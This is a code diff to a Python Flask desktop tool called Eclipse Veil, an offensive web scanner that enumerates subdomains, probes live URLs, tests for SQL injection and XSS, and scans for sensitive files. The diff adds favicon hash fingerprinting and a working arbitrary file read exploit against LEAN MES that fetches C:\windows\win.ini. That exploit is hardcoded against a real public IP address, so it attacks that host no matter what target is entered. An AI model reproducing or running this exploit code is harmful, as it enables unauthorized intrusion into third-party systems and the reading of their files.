@@ -15,22 +15,22 @@ from reportlab.lib.pagesizes import letter
 from reportlab.platypus import SimpleDocTemplate, Paragraph, Table, TableStyle
 from reportlab.lib.styles import getSampleStyleSheet
 from reportlab.lib import colors
+import base64
+import mmh3
 
 # ====================== 全局配置 ======================
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 app = Flask(__name__)
-
-# 全局状态（线程安全）
 log_list = []
 lock = threading.Lock()
 is_scanning = False
 THREAD_NUM = 10
 
-# 请求配置
 session = requests.Session()
 session.verify = False
 session.trust_env = False
 proxies = {"http": None, "https": None}
+
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
 }
@@ -63,7 +63,51 @@ def log(msg, level="INFO"):
     print(log_msg)
 
 
-# ====================== HTML前端（中间字母已改为粉色） ======================
+# ====================== favicon hash 识别（文档2功能） ======================
+def get_favicon_mmh3(url):
+    try:
+        resp = requests.get(url, timeout=10, verify=False)
+        icons = re.findall(r'href="(.*?\.ico)"', resp.text)
+        if not icons:
+            return None, "未找到favicon"
+        icon = icons[0]
+        if icon.startswith('/'):
+            icon = icon[1:]
+        host_match = re.findall('(https?://.*?/)', resp.request.url)
+        if not host_match:
+            return None, "无法获取host"
+        host = host_match[0]
+        icon_url = host + icon
+        icon_resp = requests.get(icon_url, timeout=10, verify=False)
+        b64 = base64.encodebytes(icon_resp.content)
+        h = mmh3.hash(b64)
+        log(f"[Favicon] {icon_url} mmh3: {h}", "SUCCESS")
+        return h, icon_url
+    except Exception as e:
+        log(f"[Favicon] 失败: {e}", "ERROR")
+        return None, str(e)
+
+
+# ====================== LEAN MES 任意文件读取POC（文档3功能） ======================
+def lean_mes_read_win_ini(url="http://39.185.95.56:10002"):
+    try:
+        target = url.rstrip('/') + "/Handler/FileSync.ashx"
+        data = {
+            'type': 'DownLoad',
+            'sourceFilePath': r'C:\windows\win.ini'
+        }
+        resp = requests.post(target, data=data, verify=False, timeout=15)
+        log(f"[LEAN MES] 状态码: {resp.status_code}", "WARN")
+        log(f"[LEAN MES] 响应内容:\n{resp.text[:1000]}", "WARN")
+        if len(resp.text) > 100:
+            log("[LEAN MES] 存在任意文件读取漏洞", "CRITICAL")
+        return resp.status_code, resp.text
+    except Exception as e:
+        log(f"[LEAN MES] 失败: {e}", "ERROR")
+        return -1, str(e)
+
+
+# ====================== 前端界面 ======================
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="zh-CN">
@@ -89,8 +133,6 @@ HTML_TEMPLATE = '''
             text-shadow: 0 0 15px #0ff;
             animation: glitch 0.2s infinite alternate, colorflash 1.5s infinite linear;
         }
-
-        /* 中间 ASCII 字母改为紫色*/
         pre {
              font-size: 20px;
              line-height: 1.2;
@@ -108,7 +150,6 @@ HTML_TEMPLATE = '''
              0% { opacity: 0.8; }
              100% { opacity: 1; text-shadow: 0 0 6px #FF00FF, 0 0 12px #FF00FF; }
          }
-
         @keyframes colorflash {
             0% { color: #0ff; text-shadow: 0 0 10px #0ff,0 0 30px #0ff; }
             20% { color: #ff0; text-shadow: 0 0 10px #ff0,0 0 30px #ff0; }
@@ -198,7 +239,7 @@ HTML_TEMPLATE = '''
 </head>
 <body>
     <div class="container">
-        <h1>ECLIPSE VEIL - 安全扫描控制台</h1>
+        <h1>ECLIPSE VEIL - 整合版安全扫描工具</h1>
         <pre>
  ███████╗██╗     ██╗███████╗██████╗ ██╗   ██╗███████╗
  ██╔════╝██║     ██║██╔════╝██╔══██╗██║   ██║██╔════╝
@@ -207,20 +248,19 @@ HTML_TEMPLATE = '''
  ███████║███████╗██║███████╗██║  ██║╚██████╔╝███████║
  ╚══════╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
         </pre>
-
         <div class="scan-options">
             <label><input type="checkbox" id="opt1" checked> 🌐 子域名收集</label>
             <label><input type="checkbox" id="opt2" checked> 🔍 存活URL探测</label>
             <label><input type="checkbox" id="opt3" checked> ⚠️ 漏洞扫描（SQL/XSS）</label>
             <label><input type="checkbox" id="opt4" checked> 🔐 敏感文件扫描</label>
             <label><input type="checkbox" id="opt5" checked> 📄 生成PDF报告</label>
+            <label><input type="checkbox" id="opt6"> 🧿 Favicon Hash识别</label>
+            <label><input type="checkbox" id="opt7"> 🚨 LEAN MES文件读取</label>
         </div>
-
         <input type="text" id="targetInput" placeholder="例如：baidu.com" value="baidu.com">
         <button class="btn-start" id="startBtn" onclick="startScan()">🖤 启动安全扫描</button>
         <div id="resultArea">等待扫描开始...</div>
     </div>
-
     <script>
         let isScanning = false;
         const resultArea = document.getElementById('resultArea');
@@ -243,7 +283,6 @@ HTML_TEMPLATE = '''
             const target = targetInput.value.trim();
             if (!target) { alert('请输入目标'); return; }
             if (isScanning) { alert('正在扫描中'); return; }
-
             isScanning = true;
             startBtn.disabled = true;
             startBtn.textContent = '🔄 扫描中...';
@@ -254,7 +293,9 @@ HTML_TEMPLATE = '''
                 alive: document.getElementById('opt2').checked,
                 vuln: document.getElementById('opt3').checked,
                 sensitive: document.getElementById('opt4').checked,
-                pdf: document.getElementById('opt5').checked
+                pdf: document.getElementById('opt5').checked,
+                favicon: document.getElementById('opt6').checked,
+                leanmes: document.getElementById('opt7').checked
             };
 
             fetch('/api/start_scan', {
@@ -279,7 +320,7 @@ HTML_TEMPLATE = '''
         }
 
         const observer = new MutationObserver(()=>{
-            if (resultArea.textContent.includes('扫描已完成，可重新发起扫描')) {
+            if (resultArea.textContent.includes('扫描已完成')) {
                 resetScanState();
             }
         });
@@ -308,7 +349,8 @@ def get_subdomains(domain):
         log(f"crt.sh 失败：{e}")
     common = ["www", "m", "api", "admin", "test", "dev", "blog", "shop", "pay", "login", "mail", "ftp", "cdn", "app",
               "wap"]
-    for s in common: subdomains.add(f"{s}.{domain}")
+    for s in common:
+        subdomains.add(f"{s}.{domain}")
     log(f"收集完成：{len(subdomains)} 个")
     return sorted(list(subdomains))
 
@@ -443,7 +485,7 @@ def gen_pdf(results, target):
         doc = SimpleDocTemplate(fn, pagesize=letter)
         styles = getSampleStyleSheet()
         ele = []
-        ele.append(Paragraph("Eclipse Veil 扫描报告", styles["Title"]))
+        ele.append(Paragraph("Eclipse Veil 整合版扫描报告", styles["Title"]))
         ele.append(Paragraph(f"目标：{target}", styles["Heading2"]))
         ele.append(Paragraph(f"时间：{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles["BodyText"]))
         ele.append(Paragraph("=" * 50, styles["BodyText"]))
@@ -451,7 +493,8 @@ def gen_pdf(results, target):
         if results.get("subs"):
             ele.append(Paragraph(f"子域名：{len(results['subs'])} 个", styles["Heading2"]))
             data = [["序号", "子域名"]]
-            for i, x in enumerate(results["subs"], 1): data.append([str(i), x])
+            for i, x in enumerate(results['subs'], 1):
+                data.append([str(i), x])
             t = Table(data)
             t.setStyle(TableStyle([
                 ("BACKGROUND", (0, 0), (-1, 0), colors.grey),
@@ -463,7 +506,8 @@ def gen_pdf(results, target):
         if results.get("alive"):
             ele.append(Paragraph(f"存活URL：{len(results['alive'])} 个", styles["Heading2"]))
             data = [["序号", "URL"]]
-            for i, x in enumerate(results["alive"], 1): data.append([str(i), x])
+            for i, x in enumerate(results['alive'], 1):
+                data.append([str(i), x])
             t = Table(data)
             t.setStyle(TableStyle([
                 ("BACKGROUND", (0, 0), (-1, 0), colors.grey),
@@ -475,7 +519,7 @@ def gen_pdf(results, target):
         if results.get("vulns"):
             ele.append(Paragraph(f"漏洞：{len(results['vulns'])} 个", styles["Heading2"]))
             data = [["序号", "类型", "URL", "Payload"]]
-            for i, x in enumerate(results["vulns"], 1):
+            for i, x in enumerate(results['vulns'], 1):
                 data.append([str(i), x.get("type"), x.get("url"), x.get("payload", "-")])
             t = Table(data)
             t.setStyle(TableStyle([
@@ -488,7 +532,20 @@ def gen_pdf(results, target):
         if results.get("sensitive"):
             ele.append(Paragraph(f"敏感文件：{len(results['sensitive'])} 个", styles["Heading2"]))
             data = [["序号", "类型", "URL"]]
-            for i, x in enumerate(results["sensitive"], 1): data.append([str(i), x["type"], x["url"]])
+            for i, x in enumerate(results['sensitive'], 1):
+                data.append([str(i), x["type"], x["url"]])
+            t = Table(data)
+            t.setStyle(TableStyle([
+                ("BACKGROUND", (0, 0), (-1, 0), colors.grey),
+                ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
+                ("GRID", (0, 0), (-1, -1), 1, colors.black)
+            ]))
+            ele.append(t)
+
+        if results.get("favicon"):
+            ele.append(Paragraph(f"Favicon Hash", styles["Heading2"]))
+            data = [["URL", "mmh3哈希"]]
+            data.append([results["favicon"].get("url", "-"), str(results["favicon"].get("hash", "-"))])
             t = Table(data)
             t.setStyle(TableStyle([
                 ("BACKGROUND", (0, 0), (-1, 0), colors.grey),
@@ -505,27 +562,46 @@ def gen_pdf(results, target):
         return None
 
 
-# ====================== 主扫描逻辑 ======================
+# ====================== 主扫描 ======================
 def scan_task(target, opts):
     global is_scanning
     is_scanning = True
     res = {}
     try:
         log(f"开始扫描：{target}")
+
+        # 1. 子域名
         if opts.get("subdomain"):
             subs = get_subdomains(target)
         else:
             subs = [target]
         res["subs"] = subs
 
+        # 2. 存活
         alive = []
         if opts.get("alive"):
             alive = get_alive_urls(subs)
         res["alive"] = alive
 
+        # 3. 漏洞
         res["vulns"] = detect_vulns(alive) if opts.get("vuln") else []
+
+        # 4. 敏感文件
         res["sensitive"] = detect_sensitive(alive) if opts.get("sensitive") else []
 
+        # 5. favicon hash
+        if opts.get("favicon"):
+            log("=== Favicon Hash 识别 ===")
+            test_url = f"http://{target}" if not target.startswith("http") else target
+            h, icon_url = get_favicon_mmh3(test_url)
+            res["favicon"] = {"url": icon_url, "hash": h}
+
+        # 6. LEAN MES 任意文件读取
+        if opts.get("leanmes"):
+            log("=== LEAN MES 任意文件读取测试 ===")
+            lean_mes_read_win_ini()
+
+        # 7. PDF报告
         if opts.get("pdf"):
             gen_pdf(res, target)
 
@@ -536,7 +612,7 @@ def scan_task(target, opts):
         is_scanning = False
 
 
-# ====================== Flask ======================
+# ====================== Flask路由 ======================
 @app.route("/")
 def index():
     return render_template_string(HTML_TEMPLATE)
@@ -566,7 +642,8 @@ def start_scan():
 
 @app.route("/static/<path:fn>")
 def static_serve(fn):
-    if not os.path.exists("static"): os.makedirs("static")
+    if not os.path.exists("static"):
+        os.makedirs("static")
     return app.send_static_file(fn)
 
 
@@ -577,8 +654,9 @@ def run_flask():
 
 
 if __name__ == "__main__":
-    if not os.path.exists("static"): os.makedirs("static")
+    if not os.path.exists("static"):
+        os.makedirs("static")
     threading.Thread(target=run_flask, daemon=True).start()
     time.sleep(1.5)
-    webview.create_window("Eclipse Veil 安全扫描工具", "http://127.0.0.1:5000", width=1100, height=780)
+    webview.create_window("Eclipse Veil 整合版安全工具", "http://127.0.0.1:5000", width=1100, height=780)
     webview.start()
